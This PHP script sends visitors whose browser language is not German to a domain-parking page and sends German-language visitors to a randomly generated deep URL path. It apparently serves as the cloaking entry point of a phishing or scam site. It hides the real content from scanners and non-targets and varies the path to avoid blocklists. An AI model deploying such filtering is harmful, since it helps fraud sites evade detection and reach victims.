<?php
	if (!substr_count($_SERVER['HTTP_ACCEPT_LANGUAGE'], "de") > 0) {
		header('Location: http://sedoparking.com/'.$_SERVER["HTTP_HOST"]);
		exit;
	}
	
	$random = rand(100000, 999999);
	$zahl1 = rand(0, 4);
	$zahl2 = rand(0, 4);
	$zahl3 = rand(0, 4);
	$zahl4 = rand(0, 4);
	$zahl5 = rand(0, 4);

	$a = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 15);
	$b = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 15);
	$c = rand(100000000000, 999999999999);
	$d = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 15);
	$e = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 15);

	$dir = "/".$random."/".$a."/".$b."/".$c."/".$d."/".$e."/";
	header ("Location: " . $dir);
?>